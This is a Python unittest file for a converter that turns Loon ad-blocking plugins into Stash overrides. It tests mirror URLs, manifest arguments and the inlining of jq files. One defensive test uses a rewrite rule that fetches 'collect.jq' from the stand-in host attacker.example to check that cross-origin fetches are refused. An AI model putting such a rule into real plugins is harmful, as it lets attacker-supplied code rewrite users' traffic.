from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from tools.convert import parse_stash
from tools.sync_sources import convert_source, source_fetch_url, sync_sources


class SyncSourcesTests(unittest.TestCase):
    def test_manifest_keeps_youtube_options_and_meituan_category(self) -> None:
        root = Path(__file__).resolve().parents[1]
        mappings = json.loads(
            (root / "sources" / "loon-plugins.json").read_text(encoding="utf-8")
        )
        youtube = next(item for item in mappings if item["output"] == "YouTube_remove_ads.stoverride")
        meituan = next(item for item in mappings if item["output"] == "Meituan-MeituanWaimai.stoverride")
        self.assertEqual(
            youtube["arguments"],
            {
                "blockUpload": True,
                "blockShorts": True,
                "blockImmersive": True,
                "captionLang": "zh-Hans",
                "debug": False,
            },
        )
        self.assertEqual(meituan["category"], "去广告")

    def test_kelee_sources_use_the_mirror_and_other_sources_stay_unchanged(self) -> None:
        self.assertEqual(
            source_fetch_url("https://kelee.one/Tool/Loon/Lpx/example.lpx"),
            "https://git.repcz.link/kelee.one/Tool/Loon/Lpx/example.lpx",
        )
        external = "https://github.com/fmz200/wool_scripts/raw/main/example.lpx"
        self.assertEqual(source_fetch_url(external), external)

    def test_conversion_uses_manifest_arguments_and_category(self) -> None:
        item = {
            "name": "YouTube去广告",
            "output": "YouTube_remove_ads.stoverride",
            "source": "https://kelee.one/Tool/Loon/Lpx/YouTube_remove_ads.lpx",
            "arguments": {"blockUpload": True},
            "category": "视频",
        }
        source = r"""#!name=YouTube去广告
#!desc=YouTube ads
#!author=Example
#!homepage=https://example.com
#!icon=https://example.com/icon.png
#!tag=去广告
#!date=2026-01-01
[Argument]
blockUpload=switch, false, true
[Script]
response if ${url} ~= /^https:\/\/youtubei\.googleapis\.com/i then script("https://kelee.one/Resource/JavaScript/example.js", {${blockUpload}}) with requires_body=true
"""

        converted = parse_stash(convert_source(item, source))
        self.assertEqual(converted.metadata["category"], "视频")
        self.assertEqual(
            json.loads(converted.scripts[0].argument or "{}"),
            {"blockUpload": True},
        )
        self.assertEqual(
            list(converted.script_providers.values())[0]["url"],
            "https://git.repcz.link/kelee.one/Resource/JavaScript/example.js",
        )

    def test_conversion_inlines_same_origin_loon_jq_files(self) -> None:
        item = {
            "name": "Example",
            "output": "Example.stoverride",
            "source": "https://kelee.one/Tool/Loon/Lpx/Example.lpx",
        }
        source = r"""#!name=Example
#!desc=Example plugin
#!author=Example
#!homepage=https://example.com
#!icon=https://example.com/icon.png
#!date=2026-01-01
#!tag=去广告
[Rewrite]
response if ${url} ~= /^https:\/\/api\.example\/feed$/i then response.json.jq_file("https://kelee.one/Resource/JQLang/example.jq")
"""
        jq_source = ".data.items |= map(select(.ad == false))"

        with patch("tools.sync_sources.fetch_source", return_value=jq_source) as fetch:
            converted = parse_stash(convert_source(item, source))

        self.assertEqual(
            converted.body_rewrite,
            [r"^https:\/\/api\.example\/feed$ response-jq .data.items |= map(select(.ad == false))"],
        )
        fetch.assert_called_once_with("https://kelee.one/Resource/JQLang/example.jq")

    def test_conversion_rejects_cross_origin_jq_files_before_fetching(self) -> None:
        item = {
            "name": "Example",
            "output": "Example.stoverride",
            "source": "https://kelee.one/Tool/Loon/Lpx/Example.lpx",
        }
        source = r'''#!name=Example
#!desc=Example plugin
#!author=Example
#!homepage=https://example.com
#!icon=https://example.com/icon.png
#!date=2026-01-01
#!tag=去广告
[Rewrite]
response if ${url} ~= /^https:\/\/api\.example\/feed$/i then response.json.jq_file("https://attacker.example/collect.jq")
'''

        with patch("tools.sync_sources.fetch_source") as fetch:
            with self.assertRaisesRegex(ValueError, "same-origin"):
                convert_source(item, source)
        fetch.assert_not_called()

    def test_sync_dry_run_does_not_write_and_real_sync_is_idempotent(self) -> None:
        source = """#!name=Example
#!desc=Example plugin
#!author=Example
#!homepage=https://example.com
#!icon=https://example.com/icon.png
#!tag=去广告
[Rule]
DOMAIN,example.com,REJECT
"""
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            (root / "sources").mkdir()
            (root / "stash").mkdir()
            mapping = [{
                "name": "Example",
                "source": "https://example.com/Example.lpx",
                "output": "Example.stoverride",
            }]
            (root / "sources" / "loon-plugins.json").write_text(
                json.dumps(mapping), encoding="utf-8"
            )
            output = root / "stash" / "Example.stoverride"

            with patch("tools.sync_sources.fetch_source", return_value=source):
                self.assertEqual(
                    sync_sources(root, dry_run=True), ["stash/Example.stoverride"]
                )
                self.assertFalse(output.exists())
                self.assertEqual(
                    sync_sources(root), ["stash/Example.stoverride"]
                )
                first_output = output.read_text(encoding="utf-8")
                self.assertEqual(sync_sources(root), [])

            self.assertEqual(output.read_text(encoding="utf-8"), first_output)
            self.assertEqual(parse_stash(first_output).metadata["name"], "Example")

    def test_unsupported_source_does_not_silently_produce_an_override(self) -> None:
        item = {
            "name": "Example",
            "output": "Example.stoverride",
            "source": "https://example.com/Example.lpx",
        }
        source = "#!name=Example\n[Unsupported]\nkey=value\n"
        with self.assertRaisesRegex(ValueError, "conversion warnings"):
            convert_source(item, source)


if __name__ == "__main__":
    unittest.main()
